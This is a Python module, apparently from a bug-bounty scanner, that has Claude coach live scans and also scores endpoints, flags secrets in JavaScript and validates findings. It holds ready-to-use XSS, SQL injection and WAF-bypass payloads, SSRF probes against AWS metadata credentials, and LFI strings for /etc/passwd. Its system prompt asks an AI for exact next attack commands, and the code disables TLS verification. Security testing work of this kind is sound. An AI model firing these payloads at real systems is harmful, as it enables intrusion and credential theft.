"""
TheMasterRecon AI Coach — Real-time Scan Intelligence
Provides live AI guidance as the scan runs:
- Coaches the scanner on what to try next
- Analyzes patterns in live findings
- Generates custom payloads for specific targets
- Validates findings in real-time before saving
- Explains each finding instantly as it's discovered
"""
import os, json, re, time, logging, ssl, urllib.request
from typing import Optional, Dict, List

log     = logging.getLogger("elite.ai_coach")
API_KEY = os.environ.get("ANTHROPIC_API_KEY", "")
MODEL   = "claude-sonnet-4-6"

_FAST_SYSTEM = """You are an elite bug bounty AI operating with XBOW-style evidence reasoning and Mythos-style root cause analysis.

CORE PRINCIPLES:
- Proof over probability: never treat a finding as real without evidence
- Every response references the EXACT URL/parameter from the data
- Think in attack chains: what does this finding unlock?
- False positive first: why might this NOT be exploitable?

WHEN COACHING ON A FINDING:
1. State whether this is likely real or needs verification (one sentence)
2. Give the SINGLE highest-value next action with exact command
3. If chainable, name the specific chain (e.g., "SSRF+CORS → token theft")
4. Name the bounty range if confirmed ($X-$Y based on impact)

SEVERITY RULES YOU ENFORCE:
- Single reflection alone = medium maximum, never high/critical
- CRITICAL needs: OOB callback OR data exfiltrated OR code executed
- HIGH needs: 2+ independent signals
- Panels at 75% confidence = run curl first, never assume exposed

STYLE: Direct. Technical. No preamble. Max 4 sentences."""

def _ssl_ctx():
    c = ssl.create_default_context()
    c.check_hostname = False; c.verify_mode = ssl.CERT_NONE
    return c

def _claude_fast(prompt: str, max_tokens: int = 200) -> str:
    """Ultra-fast Claude call for real-time coaching (no streaming)."""
    if not API_KEY:
        return ""
    body = json.dumps({
        "model": MODEL, "max_tokens": max_tokens,
        "system": _FAST_SYSTEM,
        "messages": [{"role":"user","content":prompt}],
        "temperature": 0.5,
    }).encode()
    req = urllib.request.Request(
        "https://api.anthropic.com/v1/messages", data=body,
        headers={"x-api-key": API_KEY, "anthropic-version": "2023-06-01",
                 "content-type": "application/json"}, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=30, context=_ssl_ctx()) as resp:
            d = json.loads(resp.read())
            for block in d.get("content", []):
                if block.get("type") == "text":
                    return block["text"].strip()
    except Exception as e:
        log.debug(f"[ai_coach] {e}")
    return ""

def coach_on_finding(finding: dict, domain: str, tech: list = None,
                     all_findings: list = None) -> str:
    """
    Give instant tactical advice when a new finding is discovered.
    Called async during scan — result emitted as ai_tip SSE event.
    """
    bug    = finding.get("bug","?").upper()
    url    = finding.get("url","")
    sev    = finding.get("severity","medium")
    poc    = finding.get("poc","")[:100]
    param  = finding.get("param","")
    conf   = finding.get("confidence",50)
    tech   = tech or []
    others = [f.get("bug","") for f in (all_findings or []) if f.get("url","") != url][:5]

    chain_hint = ""
    if others:
        chain_hint = f"\nOther bugs found: {', '.join(set(others))}"
        # Suggest specific chains
        if "ssrf" in others and bug == "IDOR":
            chain_hint += "\n⛓ CHAIN OPPORTUNITY: SSRF+IDOR could lead to internal account takeover"
        if "xss" in others and bug in ("CORS","IDOR"):
            chain_hint += "\n⛓ CHAIN OPPORTUNITY: XSS+CORS could exfiltrate authenticated API data"

    # Inject RAG context — find similar confirmed H1 reports
    rag_context = ""
    try:
        from engine.rag_db import search as rag_search
        similar = rag_search(f"{bug} {url[:40]}", top_k=2, bug_type=bug.lower())
        if similar:
            rag_context = "\nSimilar confirmed H1 reports:\n"
            for r in similar[:2]:
                bounty = f" (${r.get('bounty',0)})" if r.get('bounty') else ""
                rag_context += f"  • {r.get('title','?')[:60]}{bounty}\n"
    except Exception:
        pass

    # Get XBOW grade if available
    xbow_info = ""
    if all_findings:
        cur = next((f for f in (all_findings or []) if f.get('url') == url), None)
        if cur and cur.get('_xbow_grade'):
            xbow_info = f"\nXBOW Grade: {cur.get('_xbow_grade')} — {cur.get('_xbow_verdict','')}"

    prompt = f"""Finding: {sev.upper()} {bug} on {domain}
URL: {url[:80]}
Param: {param or 'unknown'}
Confidence: {conf}%
PoC: {poc[:100] if poc else 'none yet'}
Tech: {', '.join(tech[:5]) if tech else 'unknown'}{chain_hint}{rag_context}{xbow_info}

Is this real? What is the single highest-value next action? Include exact command."""

    return _claude_fast(prompt, max_tokens=180)


def suggest_next_test(domain: str, current_bug: str, endpoint: str,
                      tech: list = None, waf: str = "") -> str:
    """
    Mid-scan coaching: while scanning bug type X on endpoint Y,
    what specific variant/payload should we try next?
    """
    tech = tech or []
    # Get payloads from H1 intelligence
    h1_payloads = ""
    try:
        from engine.h1_ingest import get_payloads as h1_get
        payloads = h1_get(current_bug, limit=3)
        if payloads:
            h1_payloads = f"\nH1 observed payloads for {current_bug}: {' | '.join(payloads[:3])}"
    except Exception:
        pass

    prompt = f"""Scanner context:
Bug: {current_bug.upper()}
Endpoint: {endpoint[:80]}
Tech stack: {', '.join(tech[:5]) if tech else 'unknown'}
WAF: {waf or 'none detected'}{h1_payloads}

Based on this specific tech stack, suggest the single payload most likely to work.
Format: [TECHNIQUE]: [exact payload or curl command]"""

    return _claude_fast(prompt, max_tokens=120)


def rate_endpoint_risk(endpoint: str, tech: list = None) -> dict:
    """
    Fast risk rating for an endpoint — which bug types to prioritize.
    Returns: {risk_score: 0-10, priority_bugs: [...], reason: "..."}
    """
    tech = tech or []
    import urllib.parse
    try:
        parsed = urllib.parse.urlparse(endpoint)
        path   = parsed.path
        params = list(urllib.parse.parse_qs(parsed.query).keys())
    except Exception:
        path, params = endpoint, []

    # Fast heuristic scoring (no AI needed for basics)
    risk   = 5
    bugs   = []
    reason = []

    # Path-based signals
    if any(k in path.lower() for k in ["/admin","/api/","/internal","/manage","/staff"]):
        risk += 2; bugs.append("misconfig"); reason.append("admin/API path")
    if any(k in path.lower() for k in ["/upload","/file","/attachment","/import"]):
        risk += 2; bugs.extend(["fileupload","lfi"]); reason.append("file handling")
    if any(k in path.lower() for k in ["/oauth","/auth","/login","/token","/sso"]):
        risk += 1; bugs.extend(["oauth","jwt","saml"]); reason.append("auth endpoint")
    if any(k in path.lower() for k in ["/graphql","/gql","/query"]):
        risk += 2; bugs.extend(["graphql","idor"]); reason.append("GraphQL endpoint")
    if any(k in path.lower() for k in ["/webhook","/callback","/notify","redirect"]):
        risk += 1; bugs.extend(["ssrf","redirect"]); reason.append("callback/webhook")

    # Param-based signals
    high_risk_params = {"id","user_id","uid","file","path","url","redirect",
                        "cmd","exec","template","include","page","lang","src"}
    for p in params:
        if p.lower() in high_risk_params:
            risk += 1
            if p.lower() in {"id","user_id","uid"}:         bugs.append("idor")
            if p.lower() in {"file","path","include","page"}: bugs.append("lfi")
            if p.lower() in {"url","redirect","src"}:         bugs.extend(["ssrf","redirect"])
            if p.lower() in {"cmd","exec","template"}:        bugs.extend(["rce","ssti"])
            reason.append(f"high-risk param: {p}")

    # Tech signals
    tech_lower = [t.lower() for t in tech]
    if any("php" in t for t in tech_lower) and "lfi" not in bugs:
        bugs.append("lfi"); reason.append("PHP detected")
    if any("spring" in t or "java" in t for t in tech_lower) and "actuator" not in bugs:
        bugs.extend(["actuator","deserialization"]); reason.append("Java/Spring detected")

    return {
        "risk_score":    min(10, risk),
        "priority_bugs": list(dict.fromkeys(bugs))[:5],  # deduplicated
        "reason":        "; ".join(reason) or "standard endpoint",
        "params":        params,
    }


def generate_targeted_payloads(bug_type: str, endpoint: str, tech: list = None,
                               waf: str = "", response_sample: str = "") -> list:
    """
    Generate payloads tailored to the specific endpoint context.
    Uses response sample to understand what context payloads land in.
    """
    tech  = tech or []

    # Fast built-in payloads by context
    CONTEXT_PAYLOADS = {
        "xss_html": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
                     "<svg onload=alert(1)>", "<details open ontoggle=alert(1)>"],
        "xss_attr": ['" onmouseover="alert(1)', "' autofocus onfocus='alert(1)'",
                     '" onfocus="alert(1)" autofocus="'],
        "xss_js":   ["'-alert(1)-'", "'+alert(1)+'", "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e"],
        "sqli_error":["'", "''", "' OR '1'='1'--", "' UNION SELECT NULL--"],
        "sqli_blind":["' AND SLEEP(5)--", "' AND 1=CONVERT(int,@@version)--",
                      "' OR 1=1 AND SLEEP(5)#", "; SELECT pg_sleep(5)--"],
        "ssrf_aws": ["http://169.254.169.254/latest/meta-data/",
                     "http://169.254.169.254/latest/meta-data/iam/security-credentials/"],
        "lfi_unix": ["../../../etc/passwd", "....//....//etc/passwd",
                     "php://filter/convert.base64-encode/resource=index.php"],
    }

    # Pick payload set based on context
    context = "generic"
    if response_sample:
        if "value=" in response_sample or 'placeholder="' in response_sample:
            context = "xss_attr"
        elif "<script" in response_sample:
            context = "xss_js"
        elif bug_type == "xss":
            context = "xss_html"
    elif bug_type in ("sqli",):
        context = "sqli_error" if "sql" in "".join(tech).lower() else "sqli_blind"
    elif bug_type == "ssrf":
        context = "ssrf_aws"
    elif bug_type == "lfi":
        context = "lfi_unix"
    elif bug_type == "xss":
        context = "xss_html"

    base_payloads = CONTEXT_PAYLOADS.get(context, CONTEXT_PAYLOADS.get("xss_html", []))

    # WAF bypass mutations
    if waf and bug_type == "xss":
        base_payloads.extend([
            "<ScRiPt>alert(1)</sCrIpT>",
            "<%00script>alert(1)</%00script>",
            "<script\x0a>alert(1)</script>",
        ])
    if waf and bug_type == "sqli":
        base_payloads.extend([
            "' /*!OR*/ '1'='1'--",
            "' OR/**/'1'='1'--",
            "'\t OR\t '1'='1'--",
        ])

    return base_payloads[:10]


def analyze_js_secrets(js_content: str, url: str) -> List[dict]:
    """
    Analyze JS content for secrets using 65+ patterns.
    Returns list of {type, value, severity, line}.
    """
    PATTERNS = [
        (r'(?i)(api[_-]?key|apikey)\s*[=:]\s*["\']([A-Za-z0-9_\-]{20,})["\']', "API Key", "high"),
        (r'(?i)(secret[_-]?key|secret)\s*[=:]\s*["\']([A-Za-z0-9_\-/+]{20,})["\']', "Secret Key", "critical"),
        (r'(?i)(password|passwd|pwd)\s*[=:]\s*["\']([^"\']{8,})["\']', "Password", "critical"),
        (r'(?i)(bearer|token)\s*[=:]\s*["\']([A-Za-z0-9_\-\.]{20,})["\']', "Bearer Token", "critical"),
        (r'AIza[0-9A-Za-z\-_]{35}', "Google API Key", "critical"),
        (r'AKIA[0-9A-Z]{16}', "AWS Access Key ID", "critical"),
        (r'(?i)aws_secret[_-]?access[_-]?key\s*[=:]\s*["\']([A-Za-z0-9/+=]{40})["\']', "AWS Secret", "critical"),
        (r'(?i)(mongodb|mysql|postgresql|redis)\+?://[^\s"\'<>]+', "Database URL", "critical"),
        (r'(?i)private[_-]?key\s*[=:]\s*["\']([^"\']{20,})["\']', "Private Key", "critical"),
        (r'(?i)(slack_token|xox[baprs]-[A-Za-z0-9\-]+)', "Slack Token", "high"),
        (r'(?i)(github[_-]?token|gh[_-]?token)\s*[=:]\s*["\']([A-Za-z0-9_]{20,})["\']', "GitHub Token", "high"),
        (r'(?i)(stripe[_-]?key)\s*[=:]\s*["\']([A-Za-z0-9_]{20,})["\']', "Stripe Key", "critical"),
        (r'(?i)(sendgrid[_-]?key|sg\.)[A-Za-z0-9_\-\.]{40,}', "SendGrid Key", "high"),
        (r'(?i)(mailgun[_-]?key)\s*[=:]\s*["\']([A-Za-z0-9_\-]{30,})["\']', "Mailgun Key", "high"),
        (r'(?i)(twilio[_-]?(account|auth)[_-]?(sid|token))\s*[=:]\s*["\']([A-Za-z0-9]{30,})["\']', "Twilio", "high"),
        (r'(?i)(firebase[_-]?api[_-]?key)\s*[=:]\s*["\']([A-Za-z0-9_\-]{30,})["\']', "Firebase Key", "high"),
        (r'(?i)(jwt|jsonwebtoken)\s*[=:]\s*["\']?(eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+)', "JWT Token", "high"),
        (r'(?i)(internal|localhost|127\.0\.0\.1|192\.168\.|10\.[0-9]+\.|172\.1[6-9]\.|172\.2[0-9]\.|172\.3[0-1]\.)[^"\'<>\s]*', "Internal URL", "medium"),
        (r'(?i)\/api\/v[0-9]+\/[a-zA-Z0-9_\/\-]+', "API Endpoint", "info"),
        (r'(?i)(admin[_-]?panel|admin[_-]?path)\s*[=:]\s*["\']([^"\']+)["\']', "Admin Path", "medium"),
        (r'(?i)(debug\s*[=:]\s*true|development\s*[=:]\s*true)', "Debug Mode", "low"),
        (r'(?i)(encryption[_-]?key|aes[_-]?key)\s*[=:]\s*["\']([A-Za-z0-9+/=]{20,})["\']', "Encryption Key", "critical"),
    ]

    findings = []
    lines = js_content.split('\n')
    found_hashes = set()

    for i, line in enumerate(lines, 1):
        for pattern, secret_type, severity in PATTERNS:
            for m in re.finditer(pattern, line):
                value = m.group(0)[:200]
                # Deduplicate
                h = hash(f"{secret_type}:{value[:50]}")
                if h in found_hashes:
                    continue
                found_hashes.add(h)
                # Skip obvious placeholders
                if any(p in value.lower() for p in ["example","placeholder","your_","<","xxx","test","dummy","sample"]):
                    continue
                findings.append({
                    "type":     secret_type,
                    "value":    value,
                    "severity": severity,
                    "line":     i,
                    "url":      url,
                    "context":  line.strip()[:120],
                    "source":   "ai_coach_js_analyzer",
                })

    return findings


def quick_validate(finding: dict):
    """
    XBOW-aligned heuristic validation — is this finding likely real?
    Returns: (is_likely_tp: bool, confidence_delta: int, reason: str)
    No API call — pure heuristic. Applied to EVERY finding before DB save.
    """
    bug  = finding.get("bug","")
    url  = finding.get("url","")
    poc  = str(finding.get("poc",""))
    conf = int(finding.get("confidence",50))
    desc = str(finding.get("description","")).lower()
    param = finding.get("param","")
    preview = str(finding.get("preview","")).lower()
    details = finding.get("details",{})

    red_flags   = []
    green_flags = []

    # ── Universal red flags ───────────────────────────────────────────────────
    if not url:
        red_flags.append("no URL")
    if conf < 25:
        red_flags.append(f"very low confidence ({conf}%)")

    # Probe paths as finding URLs (nuclei artifact)
    import re
    probe_patterns = ["/bin/bash", "/etc/passwd", "/%00", "/../", "/bin/sh"]
    if any(p in url for p in probe_patterns):
        red_flags.append(f"URL is a probe path, not a real endpoint")

    # Out-of-scope domain patterns
    if re.search(r"iso[.]org|w3c[.]org|rfc-editor[.]org|iana[.]org", url):
        red_flags.append("URL appears to be a third-party external reference, not a target endpoint")

    # ── Bug-specific validation ───────────────────────────────────────────────
    if bug == "xss":
        if not any(k in poc + desc for k in ["alert","onerror","onload","javascript:","<script","svg"]):
            red_flags.append("XSS: no execution proof in PoC (missing alert/event/script)")
        if "content-security-policy" in desc and "bypass" not in desc:
            red_flags.append("XSS: CSP present — may be blocked")
        if finding.get("oob_confirmed") or finding.get("eil_confirmed"):
            green_flags.append("XSS: OOB/EIL execution confirmed")
        if param:
            green_flags.append(f"XSS: specific parameter '{param}' identified")

    elif bug == "sqli":
        if not any(k in poc + desc for k in ["sleep","union","error","boolean","syntax","mysql","pg::"]):
            red_flags.append("SQLi: no injection technique evidence in PoC")
        if "time-based" in desc or "sleep" in poc:
            green_flags.append("SQLi: time-based delay confirmed")
        if any(k in desc for k in ["error", "mysql", "syntax error", "ora-"]):
            green_flags.append("SQLi: database error returned")

    elif bug == "ssrf":
        if not any(k in poc + desc for k in ["169.254","localhost","127.0.0.1","oob","internal","metadata","10.","192.168"]):
            red_flags.append("SSRF: no internal/metadata target in evidence")
        if finding.get("oob_confirmed"):
            green_flags.append("SSRF: OOB DNS/HTTP callback confirmed")
        if "169.254.169.254" in poc + desc:
            green_flags.append("SSRF: cloud metadata endpoint targeted")

    elif bug == "cors":
        if not details.get("origin_reflected") and "origin" not in desc:
            red_flags.append("CORS: origin reflection not confirmed")
        if "null" in str(details.get("origin_tested","")):
            red_flags.append("CORS: null origin — verify this isn't an intentional API")
        if details.get("credentials_allowed") or "access-control-allow-credentials: true" in desc.lower():
            green_flags.append("CORS: credentialed requests allowed — high impact")

    elif bug in ("rce","ssti"):
        if not any(k in poc + desc for k in ["command", "output", "executed", "{{7*7}}","sleep","id;","whoami"]):
            red_flags.append(f"{bug.upper()}: no execution evidence in PoC")
        if finding.get("oob_confirmed"):
            green_flags.append(f"{bug.upper()}: OOB callback confirmed")

    elif bug == "cache_poison":
        if not details.get("cacheable"):
            red_flags.append("Cache poisoning: response not confirmed cacheable — non-exploitable")
        if details.get("cacheable") and details.get("reflection_detected"):
            green_flags.append("Cache poisoning: reflected in cacheable response")

    elif bug == "redirect":
        if not any(k in poc + desc for k in ["evil.com","attacker.com","external","off-domain"]):
            red_flags.append("Redirect: no off-domain destination in evidence")

    elif bug == "buckets":
        if "access denied" in desc.lower() or "403" in str(finding.get("status_code","")):
            red_flags.append("Bucket 403 (private) — not exploitable, just existence")
        if "public" in desc.lower() and "sensitive" in desc.lower():
            green_flags.append("Bucket: public access with sensitive content confirmed")

    # ── Universal green flags ─────────────────────────────────────────────────
    if finding.get("oob_confirmed") or finding.get("eil_confirmed"):
        green_flags.append("OOB/EIL confirmation (deterministic proof)")
    if conf >= 85:
        green_flags.append(f"high confidence ({conf}%)")
    if poc and len(poc) > 50 and "curl" in poc:
        green_flags.append("working curl PoC present")
    if param:
        green_flags.append(f"specific vulnerable parameter '{param}' identified")

    # ── Decision ──────────────────────────────────────────────────────────────
    if len(red_flags) >= 2:
        return (False, -25, f"FP signals: {', '.join(red_flags)}")
    if len(red_flags) == 1 and not green_flags:
        return (False, -15, f"Weak signal: {red_flags[0]}")
    if len(green_flags) >= 2:
        return (True, +15, f"TP signals: {', '.join(green_flags)}")
    if len(green_flags) == 1 and not red_flags:
        return (True, +5, f"Positive signal: {green_flags[0]}")
    return (True, 0, "inconclusive — manual review recommended")
